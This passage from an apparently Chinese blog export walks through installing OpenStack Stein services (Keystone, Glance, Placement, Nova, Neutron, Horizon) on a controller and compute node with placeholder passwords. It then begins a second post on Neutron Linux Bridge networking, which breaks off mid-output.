--bootstrap-public-url http://controller:5000/v3/ \\ --bootstrap-region-id RegionOne\n下面开始配置一下Apache，编辑/etc/httpd/conf/httpd.conf配置ServerName为controller\nServerName controller\n再把keystone的apache配置链接到apache的http.d中\nln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/\n启用服务\nsystemctl enable --now httpd.service\n声明一下环境变量\nexport OS_USERNAME=adminexport OS_PASSWORD=ADMIN_PASSexport OS_PROJECT_NAME=adminexport OS_USER_DOMAIN_NAME=Defaultexport OS_PROJECT_DOMAIN_NAME=Defaultexport OS_AUTH_URL=http://controller:5000/v3export OS_IDENTITY_API_VERSION=3\n使用此链接的命令之前请务必配置上面所描述的环境变量。关于创建基础域、项目、用户和角色，具体可以参考： https://docs.openstack.org/keystone/stein/install/keystone-users-rdo.html声明客户端环境变量脚本，其他用户可以参考： https://docs.openstack.org/keystone/stein/install/keystone-openrc-rdo.html#using-the-scripts\ncat &gt; admin-openrc &lt;export OS_PROJECT_DOMAIN_NAME=Default                         export OS_USER_DOMAIN_NAME=Default                            export OS_PROJECT_NAME=admin                                  export OS_USERNAME=admin                                      export OS_PASSWORD=ADMIN_PASS                                 export OS_AUTH_URL=http://controller:5000/v3                  export OS_IDENTITY_API_VERSION=3                              export OS_IMAGE_API_VERSION=2                                 EOFchmod +x admin-openrc\n这个脚本的作用就是用来执行客户端命令的，直接用命令去操控openstack的keystone的时候必须定义这些，保存到文件是为了下次更快的设置自己的用户，下次执行命令的时候只需要执行./admin-openrc即可。这里建议验证一下服务,执行命令openstack token issue查看是否有回显，如果报错则说明搭建过程有问题。\n其他组件通用流程除了Keystone，其他服务搭建的流程都遵循下面步骤\n\n创库授权\nkeystone创建账号\nkeystone创建服务实体\n安装服务软件包\n修改服务的配置文件\n同步数据库\n启动服务\n验证\n\nGlance - 镜像服务此服务安装在控制节点，参考文档地址： https://docs.openstack.org/glance/stein/install/创库授权，进入数据库节点执行下面命令\nmysql -u root -pCREATE DATABASE glance;GRANT ALL PRIVILEGES ON glance.* TO &#x27;glance&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;GLANCE_DBPASS&#x27;;GRANT ALL PRIVILEGES ON glance.* TO &#x27;glance&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;GLANCE_DBPASS&#x27;;\n在keystone中创建账号和服务实体\n# 加载环境./admin-openrc# 创建账号openstack user create --domain default --password GLANCE_PASS glance# 如果在之前的项目创建中已经创建过service则下面这一条可以不需要执行。openstack project create --domain default \\  --description &quot;Service Project&quot; service# 给创建的用户授权，给一个admin的角色openstack role add --project service --user glance admin# 创建glance的访问实体openstack service create --name glance \\  --description &quot;OpenStack Image&quot; image# 为实体创建api访问入口# 公共的openstack endpoint create --region RegionOne \\  image public http://controller:9292# 组件之间的openstack endpoint create --region RegionOne \\  image internal http://controller:9292# 管理员的openstack endpoint create --region RegionOne \\  image admin http://controller:9292\n下面在控制节点开始安装glance的软件包\nyum install -y openstack-glance\n下面开始修改配置\n# 备份cp /etc/glance/glance-api.conf&#123;,.bak&#125;cp /etc/glance/glance-registry.conf&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/glance/glance-api.conf.bak &gt; /etc/glance/glance-api.confegrep -v &quot;^$|^#&quot; /etc/glance/glance-registry.conf.bak &gt; /etc/glance/glance-registry.conf\n编辑/etc/glance/glance-api.conf修改以下内容\n# database 段中添加下面内容connection = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance# keystone_authtoken 段中添加下面内容www_authenticate_uri  = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = Defaultuser_domain_name = Defaultproject_name = serviceusername = glancepassword = GLANCE_PASS# paste_deploy 段中添加下面内容flavor = keystone# glance_store 段中添加下面内容stores = file,httpdefault_store = filefilesystem_store_datadir = /var/lib/glance/images/\n编辑/etc/glance/glance-registry.conf修改以下内容\n# database 段中添加下面内容connection = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance# keystone_authtoken 段中添加下面内容www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = Defaultuser_domain_name = Defaultproject_name = serviceusername = glancepassword = GLANCE_PASS# paste_deploy 段中添加下面内容flavor = keystone\n以glance的身份填充数据库\nsu -s /bin/sh -c &quot;glance-manage db_sync&quot; glance\n启动服务\nsystemctl enable --now openstack-glance-api.service \\  openstack-glance-registry.service\n验证组件参考： https://docs.openstack.org/glance/stein/install/verify.html\nPlacemen - 计算安置服务此服务安装在控制节点，文档参考地址： https://docs.openstack.org/placement/stein/install/先是授权，到数据库节点执行下面命令\nmysql -u root -pCREATE DATABASE placement;GRANT ALL PRIVILEGES ON placement.* TO &#x27;placement&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;PLACEMENT_DBPASS&#x27;;GRANT ALL PRIVILEGES ON placement.* TO &#x27;placement&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;PLACEMENT_DBPASS&#x27;;\n在keystone中创建账号和服务实体\n# 加载环境./admin-openrc# 创建用户openstack user create --domain default --password PLACEMENT_PASS placement# 关联权限openstack role add --project service --user placement admin# 创建实体openstack service create --name placement \\  --description &quot;Placement API&quot; placement# 开放入口openstack endpoint create --region RegionOne \\  placement public http://controller:8778openstack endpoint create --region RegionOne \\  placement internal http://controller:8778openstack endpoint create --region RegionOne \\  placement admin http://controller:8778\n安装软件包\nyum install -y openstack-placement-api\n下面开始修改配置\n# 备份cp /etc/placement/placement.conf&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/placement/placement.conf.bak &gt; /etc/placement/placement.conf\n编辑/etc/placement/placement.conf修改以下内容\n# placement_database 段connection = mysql+pymysql://placement:PLACEMENT_DBPASS@controller/placement# api 段auth_strategy = keystone# keystone_authtoken 段auth_url = http://controller:5000/v3memcached_servers = controller:11211auth_type = passwordproject_domain_name = Defaultuser_domain_name = Defaultproject_name = serviceusername = placementpassword = PLACEMENT_PASS\n以placement的身份填充数据库\nsu -s /bin/sh -c &quot;placement-manage db sync&quot; placement\n重启http服务\nsystemctl restart httpd\n验证参考组件参考： https://docs.openstack.org/placement/stein/install/verify.html\nNova - 计算控制节点此服务安装在控制节点，参考文档地址： \n\nhttps://docs.openstack.org/nova/stein/install/\nhttps://docs.openstack.org/nova/stein/install/controller-install-rdo.html先是建库和授权，到数据库节点执行下面命令\n\nmysql -u root -pCREATE DATABASE nova_api;CREATE DATABASE nova;CREATE DATABASE nova_cell0;GRANT ALL PRIVILEGES ON nova_api.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;GRANT ALL PRIVILEGES ON nova_api.* TO &#x27;nova&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;GRANT ALL PRIVILEGES ON nova.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;GRANT ALL PRIVILEGES ON nova.* TO &#x27;nova&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;GRANT ALL PRIVILEGES ON nova_cell0.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;GRANT ALL PRIVILEGES ON nova_cell0.* TO &#x27;nova&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;\n在keystone中创建账号和服务实体\n# 凭证环境./admin-openrc# 创建用户openstack user create --domain default --password NOVA_PASS nova# 关联权限openstack role add --project service --user nova admin# 创建访问实例openstack service create --name nova \\  --description &quot;OpenStack Compute&quot; computeopenstack endpoint create --region RegionOne \\  compute public http://controller:8774/v2.1openstack endpoint create --region RegionOne \\  compute internal http://controller:8774/v2.1openstack endpoint create --region RegionOne \\  compute admin http://controller:8774/v2.1\n安装软件包\nyum install -y openstack-nova-api openstack-nova-conductor \\  openstack-nova-novncproxy openstack-nova-scheduler\n关于三个包的作用\nopenstack-nova-api 组件之间调用openstack-nova-conductor 用来协调数据库的，后期计算节点会很多，如果每个都有数据库信息这样并不安全而且也很麻烦，所以这个组件就负责计算节点之前数据库和各类调用与数据库交互用的。openstack-nova-novncproxy 创建好的机器会开放VNC，这个就是用来提供一个VNC连接的openstack-nova-scheduler 用来协调资源的，一个实例请求发送过来之后，他来判断那台主机适合创建这台机器。\n下面开始修改配置\n# 备份cp /etc/nova/nova.conf&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf\n编辑配置/etc/nova/nova.conf，主要修改下面内容\n[DEFAULT]                                                        my_ip = 10.0.0.11                                                enabled_apis = osapi_compute,metadata                            transport_url = rabbit://openstack:RABBIT_PASS@controller        use_neutron = true                                               firewall_driver = nova.virt.firewall.NoopFirewallDriver[api]                   auth_strategy = keystone[api_database]                                                   connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova_api[database]                                                                         connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova[glance]api_servers = http://controller:9292[keystone_authtoken]                                                               auth_url = http://controller:5000/v3                                               memcached_servers = controller:11211                                               auth_type = password                                                               project_domain_name = Default                                                      user_domain_name = Default                                                         project_name = service                                                             username = nova                                                                    password = NOVA_PASS[oslo_concurrency]                                               lock_path = /var/lib/nova/tmp[placement]                                                                        region_name = RegionOne                                                            project_domain_name = Default                                                      project_name = service                                                             auth_type = password                                                               user_domain_name = Default                                                         auth_url = http://controller:5000/v3                                               username = placement     password = PLACEMENT_PASS[vnc]                              enabled = true                     server_listen = $my_ip             server_proxyclient_address = $my_ip\n根据对应段进行添加配置，其中需要注意的是\n[DEFAULT]# ...use_neutron = truefirewall_driver = nova.virt.firewall.NoopFirewallDriver# ...\n这段中，在老版本的环境中，网络还不是neutron组件来管的，是nova的一个，他为了兼容添加了use_neutron这个参数，需要打开下面开始填充数据库\nsu -s /bin/sh -c &quot;nova-manage api_db sync&quot; novasu -s /bin/sh -c &quot;nova-manage cell_v2 map_cell0&quot; novasu -s /bin/sh -c &quot;nova-manage cell_v2 create_cell --name=cell1 --verbose&quot; novasu -s /bin/sh -c &quot;nova-manage db sync&quot; novasu -s /bin/sh -c &quot;nova-manage cell_v2 list_cells&quot; nova\n在执行过程中可能有一条会出现几条警告，那个无所谓别出现报错就行。启动服务，启动服务的命令和官网文档的稍微不一样，这里移除了openstack-nova-consoleauth，这个服务在18.0.0 (Rocky)的时候就被遗弃了。\nsystemctl enable --now openstack-nova-api.service \\  openstack-nova-scheduler.service \\  openstack-nova-conductor.service openstack-nova-novncproxy.service\n配置好之后验证好可以参考链接： https://docs.openstack.org/nova/stein/install/verify.html按照本文的进度搭建好的service组件应该是只有两个这是正常的，然后通过nova-status upgrade check去验证的时候会出现403的错误，这也是正常的，因为这是个bug，具体可参考文章： https://www.cnblogs.com/omgasw/p/12016839.html解决方案是编辑/etc/httpd/conf.d/00-placement-api.conf，添加配置\n&lt;Directory /usr/bin&gt;   &lt;IfVersion &gt;= 2.4&gt;      Require all granted   &lt;/IfVersion&gt;   &lt;IfVersion &lt; 2.4&gt;      Order allow,deny      Allow from all   &lt;/IfVersion&gt;&lt;/Directory&gt;\n之后重启apache服务\nsystemctl restart httpd\n即可再次尝试通过nova-status upgrade check去验证。\nNova - 计算节点下面的操作是在计算节点中操作，文档参考： https://docs.openstack.org/nova/stein/install/compute-install-rdo.html下面开始安装组件\nyum install -y openstack-nova-compute\n下面开始修改配置\n# 备份cp /etc/nova/nova.conf&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf\n编辑配置/etc/nova/nova.conf，主要修改下面内容\n[DEFAULT]                                                my_ip = 10.0.0.31                                        use_neutron = true                                       firewall_driver = nova.virt.firewall.NoopFirewallDriver  enabled_apis = osapi_compute,metadata                    transport_url = rabbit://openstack:RABBIT_PASS@controller[api]auth_strategy = keystone[glance]                            api_servers = http://controller:9292[keystone_authtoken]                                                               auth_url = http://controller:5000/v3                                               memcached_servers = controller:11211                                               auth_type = password                                                               project_domain_name = Default                                                      user_domain_name = Default                                                         project_name = service                                                             username = nova     password = NOVA_PASS[oslo_concurrency]           lock_path = /var/lib/nova/tmp[placement]                                                                        region_name = RegionOne                                                            project_domain_name = Default                                                      project_name = service                                                             auth_type = password                                                               user_domain_name = Default                                                         auth_url = http://controller:5000/v3                                               username = placement     password = PLACEMENT_PASS[vnc]                                                                              enabled = true                                                                     server_listen = 0.0.0.0                                                            server_proxyclient_address = $my_ip                       novncproxy_base_url = http://controller:6080/vnc_auto.html\n要注意的是my_ip这里需要改成自己的ip。启动服务\nsystemctl enable --now libvirtd.service openstack-nova-compute.service\n然后验证参考链接： https://docs.openstack.org/nova/stein/install/compute-install-rdo.html#add-the-compute-node-to-the-cell-database每次加计算节点的时候都需要在控制节点执行\nsu -s /bin/sh -c &quot;nova-manage cell_v2 discover_hosts --verbose&quot; nova\n这是用来发现主机的，如果不想手动去执行，则可以在nova的控制节点配置中添加这段配置\n[scheduler]discover_hosts_in_cells_interval = 300\nNeutron - 网络控制节点参考文档如下\n\nhttps://docs.openstack.org/neutron/stein/install/install-rdo.html\nhttps://docs.openstack.org/neutron/stein/install/controller-install-rdo.html\nhttps://docs.openstack.org/neutron/stein/install/controller-install-option1-rdo.html先在数据库节点去创建对应的库和授权\n\nmysql -u root -pCREATE DATABASE neutron;GRANT ALL PRIVILEGES ON neutron.* TO &#x27;neutron&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;NEUTRON_DBPASS&#x27;;GRANT ALL PRIVILEGES ON neutron.* TO &#x27;neutron&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;NEUTRON_DBPASS&#x27;;\n在keystone中创建账号和服务实体\n./admin-openrcopenstack user create --domain default --password NEUTRON_PASS neutronopenstack role add --project service --user neutron adminopenstack service create --name neutron \\  --description &quot;OpenStack Networking&quot; networkopenstack endpoint create --region RegionOne \\  network public http://controller:9696openstack endpoint create --region RegionOne \\  network internal http://controller:9696openstack endpoint create --region RegionOne \\  network admin http://controller:9696\n开始安装对应包，openstack默认提供两种网络方案，一个是提供商网络还有一个是自建网络也可以看作为阿里的VPC，这里搭建采用提供商网络，相当于桥接网络。\nyum install -y openstack-neutron openstack-neutron-ml2 \\  openstack-neutron-linuxbridge ebtables\n下面开始修改配置\n# 备份cp /etc/neutron/neutron.conf&#123;,.bak&#125;cp /etc/neutron/plugins/ml2/ml2_conf.ini&#123;,.bak&#125;cp /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;cp /etc/neutron/dhcp_agent.ini&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.confegrep -v &quot;^$|^#&quot; /etc/neutron/plugins/ml2/ml2_conf.ini.bak &gt; /etc/neutron/plugins/ml2/ml2_conf.iniegrep -v &quot;^$|^#&quot; /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.iniegrep -v &quot;^$|^#&quot; /etc/neutron/dhcp_agent.ini.bak &gt; /etc/neutron/dhcp_agent.ini\n开始配置/etc/neutron/neutron.conf\n[DEFAULT]                                                                          notify_nova_on_port_status_changes = true                                          notify_nova_on_port_data_changes = true                                            transport_url = rabbit://openstack:RABBIT_PASS@controller                          core_plugin = ml2                                                                  auth_strategy = keystone                                                           service_plugins =[database]                                                            connection = mysql+pymysql://neutron:NEUTRON_DBPASS@controller/neutron[keystone_authtoken]                                                               www_authenticate_uri = http://controller:5000                                      auth_url = http://controller:5000                                                  memcached_servers = controller:11211                                               auth_type = password                                                               project_domain_name = default                                                      user_domain_name = default                                                         project_name = service username = neutron     password = NEUTRON_PASS[oslo_concurrency]              lock_path = /var/lib/neutron/tmp[nova]                                                            auth_url = http://controller:5000                                 auth_type = password                                              project_domain_name = default                                     user_domain_name = default                                        region_name = RegionOne                                           project_name = service                                                             username = nova     password = NOVA_PASS\n配置/etc/neutron/plugins/ml2/ml2_conf.ini，这个文件时ml2模块的配置文件\n[ml2]                                                                              type_drivers = flat,vlan                                                           tenant_network_types =  mechanism_drivers = linuxbridge                                                    extension_drivers = port_security                                                  [ml2_type_flat]flat_networks = provider,net_vmnet1[securitygroup]enable_ipset = true                                                           \n配置/etc/neutron/plugins/ml2/linuxbridge_agent.ini，这里是linuxbridge的配置\n[linux_bridge]                                                                physical_interface_mappings = provider:ens33                [vxlan]                                                                       enable_vxlan = false                                                          [securitygroup]                                                               enable_security_group = true                                                  firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver\n下面开始加载系统模块，\necho &quot;br_netfilter&quot; &gt;&gt; /etc/modules-load.d/bridge.confmodprobe br_netfilter\n配置sysctl,编辑/etc/sysctl.conf\nnet.bridge.bridge-nf-call-iptables = 1 net.bridge.bridge-nf-call-ip6tables = 1\n执行sysctl -p重载,在配置的时候需要注意physical_interface_mappings文档中需要自己指定网卡名字，这里我的网卡是ens33所以指定这个，还有就是关于vxlan，因为这里是采用提供商网络，相当于桥接，不需要vxlan直接关闭，后面配置自由网络还需要开启。配置/etc/neutron/dhcp_agent.ini，这个文件是为了dhcp的配置\n[DEFAULT]interface_driver = linuxbridgedhcp_driver = neutron.agent.linux.dhcp.Dnsmasqenable_isolated_metadata = true\n在配置过程中可能有些官网字段不存在，直接自己加上即可。此时提供商网络已经配置好，现在需要开始配置neutron的其他选项，下面开始修改配置\n# 备份cp /etc/neutron/metadata_agent.ini&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/neutron/metadata_agent.ini.bak &gt; /etc/neutron/metadata_agent.ini\n编辑/etc/neutron/metadata_agent.ini,修改内容如下\n[DEFAULT]nova_metadata_host = controllermetadata_proxy_shared_secret = METADATA_SECRET\n现在neutron已经配置完成，需要去nova控制节点去对接，编辑文件/etc/nova/nova.conf,修改下面内容\n[neutron]url = http://controller:9696auth_url = http://controller:5000auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultregion_name = RegionOneproject_name = serviceusername = neutronpassword = NEUTRON_PASSservice_metadata_proxy = truemetadata_proxy_shared_secret = METADATA_SECRET\n下面开始做启动neutron的工作\n# 引用ml2模块ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini# 填充数据库su -s /bin/sh -c &quot;neutron-db-manage --config-file /etc/neutron/neutron.conf \\  --config-file /etc/neutron/plugins/ml2/ml2_conf.ini upgrade head&quot; neutron# 重启nova控制模块systemctl restart openstack-nova-api.service# 启动neutron的提供商网络,不同的网络方式启动方式不通,请注意官方文档systemctl enable --now neutron-server.service \\  neutron-linuxbridge-agent.service neutron-dhcp-agent.service \\  neutron-metadata-agent.service\n验证配置参考： https://docs.openstack.org/neutron/stein/install/verify-option1.html正常的验证效果应该是这样的\nNeutron - 网络计算节点参考文档： https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html安装组件\nyum install -y openstack-neutron-linuxbridge ebtables ipset\n备份配置\n# 备份cp /etc/neutron/neutron.conf&#123;,.bak&#125;cp /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.confegrep -v &quot;^$|^#&quot; /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini\n编辑配置/etc/neutron/neutron.conf主要修改内容如下\n[DEFAULT]                                                                          transport_url = rabbit://openstack:RABBIT_PASS@controller                          auth_strategy = keystone[keystone_authtoken]                                                               www_authenticate_uri = http://controller:5000                                      auth_url = http://controller:5000                                                  memcached_servers = controller:11211                                               auth_type = password            project_domain_name = default   user_domain_name = default      project_name = service          username = neutron              password = NEUTRON_PASS[oslo_concurrency]              lock_path = /var/lib/neutron/tmp\n下面配置ml2模块，编辑/etc/neutron/plugins/ml2/linuxbridge_agent.ini，主要内容和控制节点的一样，直接复制也行，主要内容如下\n[linux_bridge]                                                                physical_interface_mappings = provider:ens33                [vxlan]                                                                       enable_vxlan = false                                                          [securitygroup]                                                               enable_security_group = true                                                  firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver\n下面开始加载系统模块，\necho &quot;br_netfilter&quot; &gt;&gt; /etc/modules-load.d/bridge.confmodprobe br_netfilter\n配置sysctl,编辑/etc/sysctl.conf\nnet.bridge.bridge-nf-call-iptables = 1 net.bridge.bridge-nf-call-ip6tables = 1\n执行sysctl -p重载下面在计算节点的计算模块对接一下,编辑/etc/nova/nova.conf,主要修改内容如下\n[neutron]url = http://controller:9696auth_url = http://controller:5000auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultregion_name = RegionOneproject_name = serviceusername = neutronpassword = NEUTRON_PASS\n重启计算节点的nova服务\nsystemctl restart openstack-nova-compute.service\n启动计算节点的neutron模块\nsystemctl enable --now neutron-linuxbridge-agent.service\nHorizon - 仪表盘服务参考文档： \n\nhttps://docs.openstack.org/horizon/stein/install/\nhttps://docs.openstack.org/horizon/stein/install/install-rdo.html这里把仪表盘安装在控制节点中，执行下面命令安装软件包\n\nyum install -y openstack-dashboard\n这里备份一下配置\ncp /etc/openstack-dashboard/local_settings ~/\n编辑/etc/openstack-dashboard/local_settings,主要修改内容如下\n# 设置主机名OPENSTACK_HOST = &quot;controller&quot;# 这里是设置允许访问的主机名，*代表全部ALLOWED_HOSTS = [&#x27;*&#x27;]# 会话存储引擎指定SESSION_ENGINE = &#x27;django.contrib.sessions.backends.cache&#x27;# 缓存配置CACHES = &#123;    &#x27;default&#x27;: &#123;         &#x27;BACKEND&#x27;: &#x27;django.core.cache.backends.memcached.MemcachedCache&#x27;,         &#x27;LOCATION&#x27;: &#x27;controller:11211&#x27;,    &#125;&#125;# **Keystone** 服务的 URLOPENSTACK_KEYSTONE_URL = &quot;http://%s:5000/v3&quot; % OPENSTACK_HOST# 启用 Keystone 多域支持OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True# 定义 OpenStack 服务的 API 版本OPENSTACK_API_VERSIONS = &#123;    &quot;identity&quot;: 3,    &quot;image&quot;: 2,    &quot;volume&quot;: 3,&#125;# 这是 Keystone 服务的配置项，指定默认的域名。OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = &quot;Default&quot;# 新增用户的默认角色(ROLE)OPENSTACK_KEYSTONE_DEFAULT_ROLE = &quot;user&quot;# Neutron 网络服务的设置OPENSTACK_NEUTRON_NETWORK = &#123;    ...    &#x27;enable_router&#x27;: False,    &#x27;enable_quotas&#x27;: False,    &#x27;enable_distributed_router&#x27;: False,    &#x27;enable_ha_router&#x27;: False,    &#x27;enable_lb&#x27;: False,    &#x27;enable_firewall&#x27;: False,    &#x27;enable_vpn&#x27;: False,    &#x27;enable_fip_topology_check&#x27;: False,&#125;# 设置时区TIME_ZONE = &quot;Asia/Shanghai&quot;\n之后再去编辑/etc/httpd/conf.d/openstack-dashboard.conf,添加下面内容\nWSGIApplicationGroup %&#123;GLOBAL&#125;\n重启服务\nsystemctl restart httpd.service memcached.service\n访问http://10.0.0.11/dashboard默认域default用户名:admin密码: ADMIN_PASS\n简单使用前言参考文档： \n\nhttps://docs.openstack.org/install-guide/launch-instance.html\nhttps://docs.openstack.org/install-guide/launch-instance-networks-provider.html这里的使用都是用命令行去创建的，自己也可以通过仪表盘去创建\n\n创建网络创建实例前，应该先创建一个网络，可以参考命令\nopenstack network create  --share --external \\  --provider-physical-network provider \\  --provider-network-type flat provider\n参数具体含义如下\n\nopenstack network create：\n\n创建一个新的网络。\n\n\n--share：\n\n使网络成为共享的网络，意味着其他租户（project）也可以使用该网络。\n\n\n--external：\n\n标记该网络为外部网络，通常指该网络连接到物理网络或者外部互联网。这通常用于提供公网访问。\n\n\n--provider-physical-network provider：\n\n指定物理网络名称为 provider。这个物理网络是指在网络拓扑中与 OpenStack 的虚拟网络连接的物理网络接口。\n\n\n--provider-network-type flat：\n\n指定网络类型为 flat，表示不使用 VLAN 或者其他网络隔离机制，所有主机之间都在同一个网络中，通常用于简单的网络环境。\n\n\nprovider：\n\n这是创建的网络名称。在这个命令中，创建的网络名称是 provider，它是外部共享网络\n\n\n\n其中provider是在neutron的ml2模块中指定的。\n[ml2]flat_networks = provider                      ```                                     之后开始创建子网，执行下面命令创建一个子网```bashopenstack subnet create --network provider \\  --allocation-pool start=START_IP_ADDRESS,end=END_IP_ADDRESS \\  --dns-nameserver DNS_RESOLVER --gateway PROVIDER_NETWORK_GATEWAY \\  --subnet-range PROVIDER_NETWORK_CIDR provider\n注意替换上面相关的参数，这里我替换后的命令是\nopenstack subnet create --network provider \\  --allocation-pool start=10.0.0.200,end=10.0.0.210 \\  --dns-nameserver 114.114.114.114 --gateway 10.0.0.2 \\  --subnet-range 10.0.0.0/24 provider\n要注意的是，因为搭建的时候采用的是供应商网络，相当于直连，想要上网网段需要和虚机网络一样，网关使用虚机的网关。\n创建规格下面开始创建规格\nopenstack flavor create --id 0 --vcpus 1 --ram 64 --disk 1 m1.nano\n创建一个id为0,cpu数量为1,内存为64,存储为1GB,名字为m1.nano的实例规格\n创建SSH密钥对# 创建密钥对ssh-keygen -q -N &quot;&quot;# 导入密钥对openstack keypair create --public-key ~/.ssh/id_rsa.pub mykey\n安全组规则给默认安全组放行icmp协议\nopenstack security group rule create --proto icmp default\n放行SSH\nopenstack security group rule create --proto tcp --dst-port 22 default\n添加安全组规则的原因是因为默认的安全组是一切都拒绝的。\n创建主机去网页中创建主机。成功运行即成功。\n问题解决启动引导卡在Booting from Hard Disk…实例创建好之后进入控制台会出现一直卡在Booting from Hard Disk这一步，这个似乎是因为nova默认设置的主板型号和实际运行的不兼容具体的解决办法是修改nova计算节点的配置文件/etc/nova/nova.conf，修改内容如下\n# libvirt 段增加[libvirt]hw_machine_type=x86_64=pc-i440fx-rhel7.2.0\nx86_64类型不多说，后面的这个内容是没有问题的型号，因为刚才创建了一台Test主机，可以看一下他的默认型号，他默认使7.6.修改之后重启服务\nsystemctl restart libvirtd openstack-nova-compute\n重启服务之后重启实例(硬重启)，此时就没问题了\n账号是：cirros密码：gocubsgo\n供应商网络配置子网没有网络要注意的是，因为搭建的时候采用的是供应商网络，相当于直连，想要上网网段需要和虚机网络一样，网关使用虚机的网关。使用其他的自定义的网络是不可以上网的。\n","categories":["虚拟化平台"],"tags":["开源工具","OpenStack","Stein","KVM"]},{"title":"OpenStack-内部网络原理分析","url":"/2025/02/15/OpenStack-%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","content":"前言基于组件理解文章，这里单独做一个对于openstack网络组件Neutron的理解，本文只是我自己对于它的理解，因为网上的资料比较有限，本文只能代表我个人理解，有不对的地方欢迎大佬指正。我的环境是Linux Bridge + VXLAN的形式，具体的配置体现可以参考搭建文章的下面内容\n\n官方文档-1： https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html官方文档-2： https://docs.openstack.org/neutron/stein/install/controller-install-option1-rdo.html官方文档-3： https://docs.openstack.org/neutron/stein/install/controller-install-option2-rdo.htmllinux bridge： https://blog.boychai.xyz/index.php/archives/83/ (网站已被迁移，请在本站搜索 OpenStack-Stein版搭建-1控制1计算)VXLAN： https://blog.boychai.xyz/index.php/archives/88/ (网站已被迁移，请在本站搜索 OpenStack-网络-FLAT与VXLAN)\n\n供应商-Provider网络在没有创建Self-service networks网络的的时候，创建一个主机参考下面openstack网络拓扑网络相关的信息如下主机未开机的时候，在网络控制节点的网络情况是这样的\n[root@controller ~]# ip link......2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 29: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff[root@controller ~]# brctl showbridge name     bridge id               STP enabled     interfacesbrqdd604587-35          8000.000c2908b59e       no              ens33                                                        tapa98eeb82-7a[root@controller ~]# ip a......2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope link noprefixroute       valid_lft forever preferred_lft forever8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP group default qlen 1000    link/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 29: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff    inet 10.0.0.11/24 brd 10.0.0.255 scope global brqdd604587-35       valid_lft 